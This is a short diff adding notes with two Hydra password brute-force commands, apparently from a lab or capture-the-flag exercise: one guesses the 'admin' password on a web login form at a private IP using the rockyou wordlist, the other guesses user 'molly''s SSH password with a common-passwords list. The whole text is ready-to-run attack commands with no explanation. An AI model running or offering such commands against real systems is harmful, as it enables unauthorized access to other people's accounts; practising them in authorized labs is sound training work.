@@ -1,0 +1,6 @@
+FORM:
+sudo hydra -l admin -P /usr/share/wordlists/rockyou.txt 10.82.173.73 http-post-form "/login/:username=admin&password=^PASS^:F=incorrect" -V -t 4 -w 5
+
+SSH:
+
+sudo hydra -l molly -P /usr/share/seclists/Passwords/Common-Credentials/100k-most-used-passwords-NCSC.txt 10.82.171.73 ssh -V -t 4
